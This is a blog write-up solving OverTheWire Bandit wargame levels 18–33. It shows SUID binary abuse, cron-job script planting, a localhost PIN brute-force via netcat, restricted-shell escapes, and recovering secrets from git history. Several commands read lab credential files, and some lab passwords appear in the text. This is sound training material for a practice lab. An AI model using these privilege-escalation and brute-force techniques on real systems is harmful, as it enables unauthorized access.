---
layout: post
title: OverTheWire Bandit Part 2 WriteUp
date: 2025-02-03
categories:
  - OverTheWire
  - Bandit
tags:
  - OSCP
  - OverTheWire
  - Bandit
  - CTF
  - Linux
  - SSH
  - Cryptography
  - Bash
  - BashScripting
media_subpath: /assets/img/Bandit
---
![Desktop View](Bandit.png){: w="400"  h="400" }

Welcome to part 2 of the Bandit challenge! In this section, I’ll be covering levels 18 to 32, diving deeper into Linux commands, privilege escalation, and other essential security concepts. Stay tuned as we tackle the next set of challenges!

----
## Level 18

**Level Goal**:
- The password for the next level is stored in a file **readme** in the homedirectory. Unfortunately, someone has modified **.bashrc** to log you out when you log in with SSH.

For this task we can use the command `ssh`.

**Command:**

```bash
ssh -p 2220 bandit18@bandit.labs.overthewire.org bash
```

**Breakdown:**

- **`ssh`** → Starts an SSH connection.
- **`-p 2220`** → Specifies port `2220` instead of the default `22`.
- **`bandit18@bandit.labs.overthewire.org`** → Connects as `bandit18` to the server.
- **`bash`** → Starts a new Bash shell after connecting, bypassing any restrictions set in `.bashrc`.

This approach helps avoid potential command restrictions or environment limitations applied by `.bashrc`.

After submitting the `bandit18` password, we will not see the shell prompt, but we do have access to a file named `readme` that contains the `bandit19` password

```bash
cat readme
```

---
## Level 19

**Level Goal**:
- To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.

In this case we will learn what is a **SUID** binary and how to exploit it if possible.

### What is a SUID Binary?

A **SUID (Set User ID) binary** is an executable file in Linux that runs with the permissions of its owner instead of the user executing it. This is indicated by the **`s`** permission in the owner's execute bit (`rwsr-xr-x`). It is commonly used for tasks requiring elevated privileges, such as `passwd`. However, if misconfigured, a SUID binary can be exploited for privilege escalation, allowing unauthorized users to execute commands with higher permissions than they should have.

---
Once inside of the machine we can see one file inside our current directory, named `bandit20-do`, just by the name of the file and since it's a **SUID** file owned by `bandit20`, we can guess that it allow us to execute commands as `bandit20`.

Let's execute the command with no arguments to see what it does.

```bash
./bandit20-do

Run a command as another user.
  Example: ./bandit20-do id
```

We were right, then we can now try to read the `bandit20` password file through this binary.

```bash
./bandit20-do cat /etc/bandit_pass/bandit20
```

After executing you should see the `bandit21` password in screen.

---
## Level 20

**Level Goal**:
- There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).

For this task we can use the command `nc`.

To retrieve the password for the next level, we need to **log in twice via SSH**: once as to set up the listener and once to run the `suconnect` binary.

#### **Step 1: Log in as `bandit20` and start a listener**

```bash
ssh -p 2220 bandit20@bandit.labs.overthewire.org
nc -lvnp 8888
```

- **`ssh -p 2220 bandit20@bandit.labs.overthewire.org`** → Logs into the Bandit server as `bandit20`.
- **`nc -lvnp 8888`** → Starts a Netcat listener on port `8888` to receive incoming connections.

#### **Step 2: Log in as `bandit20` in a new terminal and run `suconnect`**

```bash
ssh -p 2220 bandit20@bandit.labs.overthewire.org
./suconnect 8888
```

- **`ssh -p 2220 bandit20@bandit.labs.overthewire.org`** → Logs into the server as `bandit20`.
- **`./suconnect 8888`** → Runs the `suconnect` binary, instructing it to connect to port `8888` on `localhost`.

#### **Step 3: Send the password**

Once the connection is established, enter the **password for `bandit20`** in the Netcat listener. If correct, the next level's password (`bandit21`) will be sent back.

---
## Level 21

**Level Goal**:
- A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

### What is a CronJob?

A **cron job** is a scheduled task in Unix-based systems that runs automatically at specified intervals using the **cron daemon**. It is defined in the **crontab** (cron table) file, where users set commands to execute at specific times, dates, or periods.

A typical entry follows this format:
```bash
* * * * * command_to_run
```

Each `*` represents **minute, hour, day, month, and day of the week**, allowing precise scheduling. Cron jobs are commonly used for **automation**, like backups, system maintenance, and periodic scripts execution.

Let's see which cronjobs are settled, we can see this in most cases taking a look at `/etc/cron.d/`.

```bash
ls -l /etc/cron.d/
total 24
-rw-r--r-- 1 root root 120 Sep 19 07:08 cronjob_bandit22
-rw-r--r-- 1 root root 122 Sep 19 07:08 cronjob_bandit23
-rw-r--r-- 1 root root 120 Sep 19 07:08 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-rwx------ 1 root root  52 Sep 19 07:10 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
```

There is one file named `cronjob_bandit22`, let's see what it does.

```bash
cat /etc/cron.d/cronjob_bandit22

@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```

Every minute a bash script located at `/usr/bin/cronjob_bandit22.sh`, let's see what the script does.

```bash
cat /usr/bin/cronjob_bandit22.sh

#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

This Bash script does two things:

1. **Changes file permissions** – It sets the permissions of `/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv` to `644`, meaning it is **readable by everyone** but **writable only by the owner**.
2. **Copies the password** – It writes the contents of `/etc/bandit_pass/bandit22` (the password for `bandit22`) into the temporary file.

We can see the `bandit22` password stored at `/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv`.

```bash
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

----
## Level 22

**Level Goal**:
- A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

Let's see which cronjobs are settled, we can see this in most cases taking a look at `/etc/cron.d/`.

```bash
ls -l /etc/cron.d/
total 24
-rw-r--r-- 1 root root 120 Sep 19 07:08 cronjob_bandit22
-rw-r--r-- 1 root root 122 Sep 19 07:08 cronjob_bandit23
-rw-r--r-- 1 root root 120 Sep 19 07:08 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-rwx------ 1 root root  52 Sep 19 07:10 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
```

There is one file named `cronjob_bandit23`, let's see what it does.

```bash
cat /etc/cron.d/cronjob_bandit23

@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```

Every minute a bash script located at `/usr/bin/cronjob_bandit23.sh`, let's see what the script does.

```bash
cat /usr/bin/cronjob_bandit23.sh

#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

#### **What the Script Does**

1. **`myname=$(whoami)`**:
    
    - This command retrieves the current username using `whoami` and stores it in the variable `myname`.
        
2. **`mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)`**:
    
    - This part generates a filename based on the current username:
        
        - `echo I am user $myname`: Creates a string like `I am user bandit22` (if the current user is `bandit22`).
            
        - `md5sum`: Computes the MD5 hash of the string.
            
        - `cut -d ' ' -f 1`: Extracts only the hash value (the first field) from the `md5sum` output, which includes the hash and a filename.
            
3. **`echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"`**:
    
    - This prints a message indicating that the script is copying the password file for the current user to a file in `/tmp` with the generated hash as its name.
        
4. **`cat /etc/bandit_pass/$myname > /tmp/$mytarget`**:
    
    - This copies the contents of the password file for the current user (`/etc/bandit_pass/$myname`) to the file `/tmp/$mytarget`.
        

---

### **How to Find the Bandit23 Password**

The script is part of a cron job that runs periodically. Since the cron job is running as `bandit23`, it will execute the script with `bandit23` as the user. This means:

- The script will generate a filename based on the string `I am user bandit23`.
    
- It will copy the password for `bandit23` to a file in `/tmp` with the generated hash as its name.
    

To find the password for `bandit23`, you can simulate what the script does:

1. **Generate the filename**:  
    Run the following command to compute the MD5 hash of the string `I am user bandit23`:
```bash
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
```

- This will output a hash like `8ca319486bfbbc3663ea0fbe81326349`.
    
- **Locate the file in `/tmp`**:  
    The password for `bandit23` will be stored in a file in `/tmp` with the name of the hash you just generated. For example:
```bash
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```

This will display the password for `bandit23`.

---
## Level 23

**Level Goal**:
- A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

Let's see which cronjobs are settled, we can see this in most cases taking a look at `/etc/cron.d/`.

```bash
ls -l /etc/cron.d/
total 24
-rw-r--r-- 1 root root 120 Sep 19 07:08 cronjob_bandit22
-rw-r--r-- 1 root root 122 Sep 19 07:08 cronjob_bandit23
-rw-r--r-- 1 root root 120 Sep 19 07:08 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-rwx------ 1 root root  52 Sep 19 07:10 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
```

There is one file named `cronjob_bandit24`, let's see what it does.

```bash
cat /etc/cron.d/cronjob_bandit24

@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Every minute a bash script located at `/usr/bin/cronjob_bandit24.sh`, let's see what the script does.

```bash
cat /usr/bin/cronjob_bandit24.sh

#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

#### **What the Script Does**

1. **`myname=$(whoami)`**:
    
    - Retrieves the current username (in this case, `bandit23`).
        
2. **`cd /var/spool/$myname/foo`**:
    
    - Changes the working directory to `/var/spool/bandit23/foo`.
        
3. **`for i in * .*`**:
    
    - Loops through all files in the directory, including hidden files (`.` and `..` are excluded).
        
4. **`owner="$(stat --format "%U" ./$i)"`**:
    
    - Retrieves the owner of the file using the `stat` command.
        
5. **`if [ "${owner}" = "bandit23" ]; then`**:
    
    - Checks if the file is owned by `bandit23`. If so, it executes the file with a 60-second timeout.
        
6. **`timeout -s 9 60 ./$i`**:
    
    - Executes the file and kills it if it runs for more than 60 seconds.
        
7. **`rm -f ./$i`**:
    
    - Deletes the file after execution.

### **Exploiting the Script**

Since the script runs as `bandit24` and executes files owned by `bandit23`, you can place a script in `/var/spool/bandit24/foo` that copies the password for `bandit24` to a location where you can read it (e.g., `/tmp`).

#### **Steps to Exploit**

1. **Create a Script**:  
    Write a script that copies the password file for `bandit24` (`/etc/bandit_pass/bandit24`) to a location where you can read it (e.g., `/tmp`).
    
    Example script (`exploit.sh`):
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password
```

2. **Place the Script in `/var/spool/bandit24/foo`**:

- Copy the script to `/var/spool/bandit24/foo` and ensure it’s owned by `bandit23`.

```bash
# Create the script
echo '#!/bin/bash' > /tmp/exploit.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password' >> /tmp/exploit.sh

# Make it executable
chmod +x /tmp/exploit.sh

# Copy it to /var/spool/bandit24/foo
cp /tmp/exploit.sh /var/spool/bandit24/foo/
```

- **Wait for the Cron Job to Execute**:
    
    - The cron job will eventually run the script, execute it as `bandit24`, and copy the password for `bandit24` to `/tmp/bandit24_password`.
        
- **Retrieve the Password**:
    
    - Once the cron job has run, read the password from `/tmp/bandit24_password`:
```bash
cat /tmp/bandit24_password
```

---
## Level 24

**Level Goal**:
- A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

For this task I've created a bash script, that will generate every combination from `0000` to `9999`.

```bash
#!/bin/bash


for i in {0000..9999}; do
	echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"

done
```

#### **What the Script Does**

1. **`for i in {0000..9999}`**:
    
    - Loops through all 4-digit combinations from `0000` to `9999`.
        
2. **`echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"`**:
    
    - For each iteration, it prints the password for `bandit24` (`gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`) followed by the current 4-digit pincode (`$i`).

Then, since my script do not send any data, we have to submit each combination through `netcat`, we can achieve this piping the script with the `netcat` connection.

```bash
./exploit.sh | nc 127.0.0.1 30002
```

#### **What This Command Does**

1. **`./exploit.sh`**:
    
    - Executes your script, which generates all possible combinations of the password for `bandit24` and a 4-digit pincode.
        
2. **`| nc 127.0.0.1 30002`**:
    
    - Pipes the output of your script to `nc` (Netcat), which sends the data to the daemon listening on `127.0.0.1` (localhost) at port `30002`.

When the correct combination is found, the daemon will return the password for `bandit25`.

----
## Level 25

**Level Goal**
- Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.

For this task we can start by checking what shell is assigned to the user `bandit26`.

```bash
cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```

The user `bandit26` is using a binary called `showtext` as shell, let's see what this binary is.

```bash
cat /usr/bin/showtext 

#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
```

### **What the Script Does**

1. Sets the `TERM` environment variable to `linux` to ensure proper terminal behavior.
    
2. Opens the file `~/text.txt` using the `more` pager, allowing the user to view its contents.
    
3. The script terminates when the user exits the `more` pager.

If we dig a bit in the `more` help page, we can learn that we can execute commands once inside of a page, so if we force `more` to open as pager and not just a `cat`, we can try to see the gain an unrestricted shell.

We can easily force `more` to act as a pager by resizing our shell into a smaller one, then just log in as `bandit26` and you should see a message at the bottom: `--more-- (66%)`.

Then we can execute commands pressing the key `v` and then writing the next commands:

```bash
:set shell=/bin/bash
:shell
```

After executing we should have access to a shell as `bandit26`.

---
## Level 26

**Level Goal**:
- Good job getting a shell! Now hurry and grab the password for bandit27!

This level is entirely the same as the **Level 20**.

Once inside of the machine we can see one file inside our current directory, named `bandit27-do`, just by the name of the file and since it's a **SUID** file owned by `bandit27`, we can guess that it allow us to execute commands as `bandit27`.

Let's execute the command with no arguments to see what it does.

```bash
./bandit27-do

Run a command as another user.
  Example: ./bandit27-do id
```

We were right, then we can now try to read the `bandit27` password file through this binary.

```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

After executing you should see the `bandit28` password in screen.

---

## Level 27

**Level Goal**:
- There is a git repository at `ssh://bandit27-git@localhost/home/bandit27-git/repo` via the port `2220`. The password for the user `bandit27-git` is the same as for the user `bandit27`.
- Clone the repository and find the password for the next level.

Let's clone the repository and see what are we facing.

```bash
git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
```

After it gets downloaded we get into the directory named `repo` and after listing the content we can see a `README` file.

```bash
cd repo
ls -l
cat README | awk 'NF{print $NF}'
```

Inside of the `README` file we can find the password of the user `bandit28`

---
## Level 28

**Level Goal**:
- There is a git repository at `ssh://bandit28-git@localhost/home/bandit28-git/repo` via the port `2220`. The password for the user `bandit28-git` is the same as for the user `bandit28`.
- Clone the repository and find the password for the next level.

Let's clone the repository and see what are we facing.

```bash
git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
```

After it gets downloaded we get into the directory named `repo` and after listing the content we can see a `README.md` file.

```bash
cd repo
ls -l
```

The `README.md` file contains the following content:

```bash
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx
```

There is a censured password field, but this repository may have suffered commits and the password has been visible in the past.

```bash
git log -p

commit 817e303aa6c2b207ea043c7bba1bb7575dc4ea73 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Sep 19 07:08:39 2024 +0000

    fix info leak

diff --git a/README.md b/README.md
index d4e3b74..5c6457b 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials
 
 - username: bandit29
-- password: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
+- password: xxxxxxxxxx
```

- **`git log`**: Shows the commit history, including commit hashes, authors, dates, and commit messages.
    
- **`-p` (or `--patch`)**: Adds the "diff" (changes) for each commit, showing exactly what was added or removed in that commit.

In the results we can see that there is a commit named `fix info leak` that shows that the password field has been changed from the password to a censored password.

---
## Level 29

**Level Goal**:
- There is a git repository at `ssh://bandit29-git@localhost/home/bandit29-git/repo` via the port `2220`. The password for the user `bandit29-git` is the same as for the user `bandit29`.
- Clone the repository and find the password for the next level.

Let's clone the repository and see what are we facing.

```bash
git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
```

After it gets downloaded we get into the directory named `repo` and after listing the content we can see a `README.md` file.

```bash
cd repo
ls -l
```

The `README.md` file contains the following content:

```bash
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: <no passwords in production!>
```

In this case after executing `git log -p` we don't see any change, but we can try to see if there is any change in other branch.

```bash
git branch -r
  origin/HEAD -> origin/master
  origin/dev
  origin/master
  origin/sploits-dev
```

- **`git branch`**: Manages branches in your repository.
    
- **`-r` (or `--remotes`)**: Specifies that only remote-tracking branches should be listed.

The `dev` branch looks interesting, so let's migrate to the `dev` branch.

```bash
git checkout dev
```

- **`git checkout`**: Switches to a branch or commit.
    
- **`dev`**: The branch you want to switch to.

Once inside if we try opening the `README.md` file we can see that the password is now in the password field.

---
## Level 30

**Level Goal**:
- There is a git repository at `ssh://bandit30-git@localhost/home/bandit30-git/repo` via the port `2220`. The password for the user `bandit30-git` is the same as for the user `bandit30`.
- Clone the repository and find the password for the next level.

Let's clone the repository and see what are we facing.

```bash
git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
```

After it gets downloaded we get into the directory named `repo` and after listing the content we can see a `README.md` file.

```bash
cd repo
ls -l
```

The `README.md` file contains the following content:

```bash
cat README.md 
just an epmty file... muahaha
```

We will find nothing in the logs and branches, so let's see if there is any **tag**.

```bash
git tag

secret
```

- This will display all the tags in your repository.

There is a tag named secret, let's see what's inside.

```bash
git show secret
```

This will display the password for `bandit31`.

---
## Level 31

**Level Goal**:
- There is a git repository at `ssh://bandit31-git@localhost/home/bandit31-git/repo` via the port `2220`. The password for the user `bandit31-git` is the same as for the user `bandit31`.
- Clone the repository and find the password for the next level.

Let's clone the repository and see what are we facing.

```bash
git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo
```

After it gets downloaded we get into the directory named `repo` and after listing the content we can see a `README.md` file.

```bash
cd repo
ls -l
```

The `README.md` file contains the following content:

```bash
cat README.md 
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master
```

It is asking us to make a commit with the conditions that we can see above, so let's start by creating the file `key.txt` and adding the content `May I come in?`.

```bash
echo "May I come in?" > key.txt
```

Then we have to add the file to t

```bash
git add -f key.txt
git commit -m "Adding new key"
git push -u origin master
```

**Summary of the Workflow**:

1. **Force-add `key.txt`** to the staging area, even if it's ignored.
    
2. **Commit the changes** with a message describing what was done.
    
3. **Push the changes** to the `master` branch on the remote repository (`origin`) and set up tracking for future pushes/pulls.

After pushing the changes, we should see the password of the user `bandit32` in the output.

----
## Level 32

**Level Goal**:
- After all this `git` stuff, it’s time for another escape. Good luck!

In this level we are facing a shell called the `UPPERCASE SHELL`, this shell changes all lower case letters to upper case letters, this means that we can't execute any command.

In most UNIX-like systems, there is a universal variable, `$0`, which typically refers to the current shell (e.g., `bash`). When you execute `$0`, it spawns a new instance of the shell, potentially providing an unrestricted shell environment.

```bash
$0
```

Once with a normal bash, we can read the `bandit33` password at `/etc/bandit_pass/bandit33`

## Level 33

There is no level 33, after login as `bandit33` we will see just a congratulation file.

So that means that this level is the last one.

## Conclusion  

We’ve now completed the Bandit wargame, having tackled its challenges and honed our Linux and security skills. Thank you to **OverTheWire** for this invaluable learning experience.

Whether you’re starting out or advancing your knowledge, these exercises provide a solid foundation for further exploration in cybersecurity.

Thank you for following along. Keep learning, practicing, and **Happy Hacking**.